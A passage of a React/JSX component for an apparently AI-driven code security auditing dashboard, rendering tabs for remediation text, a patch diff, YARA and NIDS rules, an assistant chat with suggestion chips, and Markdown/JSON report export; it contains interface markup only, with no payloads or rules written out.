                      <div className="space-y-1.5">
                        <div className="font-mono text-[11px] font-semibold text-[#a8e6cf] flex items-center gap-1.5">
                          <i className="ri-shield-check-line"></i> ACTIONABLE ARCHITECTURAL FIX
                        </div>
                        <p className="text-[#c4c6d0] leading-relaxed bg-[#141218] p-3.5 rounded-xl border border-[#49454f]/30">
                          {auditResult.recommendedRemediation}
                        </p>
                      </div>
                    </div>
                  )}

                  {/* TAB 2: HARDENED PATCH & CODE DIFF */}
                  {resultTab === 'diff' && (
                    <div className="space-y-3 font-mono text-xs">
                      <div className="flex items-center justify-between text-[11px]">
                        <span className="text-[#a8c7fa] font-semibold flex items-center gap-1.5">
                          <i className="ri-check-double-line"></i> HARDENED REFACTOR PATCH
                        </span>
                        <button
                          onClick={() => handleCopy(auditResult.patchedSnippet, 'patch')}
                          className="px-2.5 py-1 rounded bg-[#2b2930] hover:bg-[#36343b] text-[#c2e7ff] text-[11px] font-mono cursor-pointer border border-[#49454f]/40"
                        >
                          {copiedField === 'patch' ? 'COPIED!' : 'COPY PATCH'}
                        </button>
                      </div>

                      <pre className="bg-[#141218] p-4 rounded-xl border border-[#49454f]/30 text-[#a8e6cf] overflow-x-auto max-h-64 leading-relaxed">
                        <code>{auditResult.patchedSnippet}</code>
                      </pre>

                      {auditResult.diffUnified && (
                        <div className="space-y-1 pt-2">
                          <div className="text-[11px] text-[#8e9199] font-mono">GIT UNIFIED DIFF COMPARISON:</div>
                          <pre className="bg-[#0f0e13] p-3.5 rounded-xl border border-[#49454f]/30 overflow-x-auto max-h-48 text-[11px] leading-relaxed font-mono">
                            {auditResult.diffUnified.split('\n').map((line, idx) => (
                              <div
                                key={idx}
                                className={
                                  line.startsWith('+')
                                    ? 'text-[#a8e6cf] bg-[#00522b]/20 px-1'
                                    : line.startsWith('-')
                                    ? 'text-[#ffb4ab] bg-[#60000e]/20 px-1'
                                    : 'text-[#8e9199]'
                                }
                              >
                                {line}
                              </div>
                            ))}
                          </pre>
                        </div>
                      )}
                    </div>
                  )}

                  {/* TAB 3: YARA & SIEM RULES */}
                  {resultTab === 'yara' && (
                    <div className="space-y-3 font-mono text-xs">
                      <div className="flex items-center justify-between text-[11px]">
                        <span className="text-[#a8c7fa] font-semibold flex items-center gap-1.5">
                          <i className="ri-radar-line"></i> SYNTHESIZED YARA DETECTION RULE
                        </span>
                        <button
                          onClick={() => handleCopy(auditResult.yaraRule || '', 'yara')}
                          className="px-2.5 py-1 rounded bg-[#2b2930] hover:bg-[#36343b] text-[#c2e7ff] text-[11px] font-mono cursor-pointer border border-[#49454f]/40"
                        >
                          {copiedField === 'yara' ? 'COPIED!' : 'COPY RULE'}
                        </button>
                      </div>

                      <pre className="bg-[#141218] p-4 rounded-xl border border-[#49454f]/30 text-[#e8def8] overflow-x-auto max-h-56 leading-relaxed">
                        <code>{auditResult.yaraRule || '// No YARA signature synthesized for this vector.'}</code>
                      </pre>

                      {auditResult.detectionSignature && (
                        <div className="space-y-1 pt-2">
                          <div className="text-[11px] text-[#8e9199] font-mono">SURICATA / SNORT NIDS RULE:</div>
                          <div className="bg-[#141218] p-3 rounded-xl border border-[#49454f]/30 text-[#ffb870] font-mono text-[11px] break-all">
                            {auditResult.detectionSignature}
                          </div>
                        </div>
                      )}
                    </div>
                  )}

                  {/* TAB 4: INTERACTIVE AI CHAT */}
                  {resultTab === 'chat' && (
                    <div className="space-y-3 font-sans text-xs flex flex-col h-[340px]">
                      <div className="text-[11px] font-mono text-[#8e9199] flex items-center justify-between">
                        <span>OFFSEC AI ASSISTANT CHAT:</span>
                        <span>GEMINI 3.6 FLASH</span>
                      </div>

                      {/* Chat Messages Container */}
                      <div className="flex-1 overflow-y-auto space-y-2.5 pr-1 bg-[#141218] p-3 rounded-xl border border-[#49454f]/30">
                        {chatMessages.map((msg) => (
                          <div
                            key={msg.id}
                            className={`flex flex-col space-y-1 ${
                              msg.sender === 'user' ? 'items-end' : 'items-start'
                            }`}
                          >
                            <div className="text-[10px] font-mono text-[#8e9199]">
                              {msg.sender === 'user' ? 'YOU' : 'LABIB B. SHAHED (AI)'} • {msg.timestamp}
                            </div>
                            <div
                              className={`p-3 rounded-xl max-w-[90%] leading-relaxed whitespace-pre-wrap ${
                                msg.sender === 'user'
                                  ? 'bg-[#004a77] text-[#c2e7ff] rounded-tr-none'
                                  : 'bg-[#2b2930] text-[#e6e0e9] border border-[#49454f]/30 rounded-tl-none'
                              }`}
                            >
                              {msg.text}
                            </div>
                          </div>
                        ))}
                        {isChatLoading && (
                          <div className="flex items-center gap-2 text-xs text-[#a8c7fa] font-mono p-2">
                            <i className="ri-loader-4-line animate-spin"></i> Synthesizing response...
                          </div>
                        )}
                      </div>

                      {/* Quick Suggestion Chips */}
                      <div className="flex flex-wrap gap-1.5 pt-1">
                        <button
                          onClick={() => handleSendChat('How do I test this exploit in Burp Suite / curl?')}
                          className="px-2 py-0.5 rounded-full bg-[#211f26] border border-[#49454f]/40 text-[10px] text-[#c4c6d0] hover:text-white cursor-pointer"
                        >
                          🧪 Burp / Curl Test
                        </button>
                        <button
                          onClick={() => handleSendChat('How to write an automated unit test for this patch?')}
                          className="px-2 py-0.5 rounded-full bg-[#211f26] border border-[#49454f]/40 text-[10px] text-[#c4c6d0] hover:text-white cursor-pointer"
                        >
                          🛡️ Unit Test Fix
                        </button>
                      </div>

                      {/* Chat Input Bar */}
                      <div className="flex items-center gap-2 pt-1">
                        <input
                          type="text"
                          value={chatInput}
                          onChange={(e) => setChatInput(e.target.value)}
                          onKeyDown={(e) => e.key === 'Enter' && handleSendChat()}
                          placeholder="Ask follow-up question regarding this vulnerability..."
                          className="flex-1 bg-[#141218] border border-[#49454f]/40 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-[#a8c7fa] font-sans"
                        />
                        <button
                          onClick={() => handleSendChat()}
                          disabled={isChatLoading || !chatInput.trim()}
                          className="m3-btn-primary m3-btn-sm !px-3 cursor-pointer disabled:opacity-50"
                        >
                          <i className="ri-send-plane-fill"></i>
                        </button>
                      </div>
                    </div>
                  )}

                  {/* TAB 5: EXPORT & REPORT GENERATION */}
                  {resultTab === 'export' && (
                    <div className="space-y-4 font-sans text-xs">
                      <div className="bg-[#141218] p-4 rounded-xl border border-[#49454f]/30 space-y-3">
                        <h4 className="font-mono font-semibold text-[#a8c7fa] text-xs">EXPORT SECURITY REPORT</h4>
                        <p className="text-[#c4c6d0] leading-relaxed">
                          Export complete findings for executive briefing, JIRA ticket integration, or repository security documentation.
                        </p>
                        <div className="flex flex-wrap gap-2 pt-2">
                          <button
                            onClick={() => {
                              const mdContent = `# SECURITY AUDIT REPORT: ${auditResult.vulnerabilityType}\n\n**Severity:** ${auditResult.severity}\n**CWE:** ${auditResult.cwe}\n**Risk Score:** ${auditResult.riskScore}/100\n\n## Threat Analysis\n${auditResult.analysis}\n\n## Recommended Remediation\n${auditResult.recommendedRemediation}\n\n## Hardened Code Patch\n\`\`\`\n${auditResult.patchedSnippet}\n\`\`\`\n`;
                              const blob = new Blob([mdContent], { type: 'text/markdown' });
                              const url = URL.createObjectURL(blob);
                              const a = document.createElement('a');
                              a.href = url;
                              a.download = `security-audit-${auditResult.vulnerabilityType.toLowerCase().replace(/[^a-z0-9]/g, '-')}.md`;
                              a.click();
                              soundEngine.play('success');
                            }}
                            className="m3-btn-primary m3-btn-sm cursor-pointer"
                          >
                            <i className="ri-file-text-line"></i> Download Markdown (.md)
                          </button>
                          <button
                            onClick={() => handleCopy(JSON.stringify(auditResult, null, 2), 'export_json')}
                            className="m3-btn-tonal m3-btn-sm cursor-pointer"
                          >
                            <i className="ri-file-code-line"></i> {copiedField === 'export_json' ? 'COPIED JSON!' : 'Copy Raw JSON'}
                          </button>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              ) : (
                <div className="h-full flex flex-col items-center justify-center text-center p-8 space-y-4 my-auto">
                  <div className="w-16 h-16 rounded-full bg-[#004a77]/30 border border-[#a8c7fa]/30 flex items-center justify-center text-[#a8c7fa] text-3xl shadow-lg">
                    <i className="ri-radar-line animate-pulse"></i>
                  </div>
                  <div className="space-y-1">
                    <h3 className="text-base font-bold text-white">
                      Awaiting Source Payload for AI Inspection
                    </h3>
                    <p className="text-xs text-[#8e9199] max-w-md font-sans leading-relaxed">
                      Select a preset vulnerability from the left panel, upload a custom file, or paste source code to initiate Gemini 3.6 Flash security auditing.
                    </p>
                  </div>
                  <button
                    onClick={runAudit}
                    className="m3-btn-tonal m3-btn-sm cursor-pointer mt-2"
                  >
                    <i className="ri-play-circle-line"></i> Run Default Audit
                  </button>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
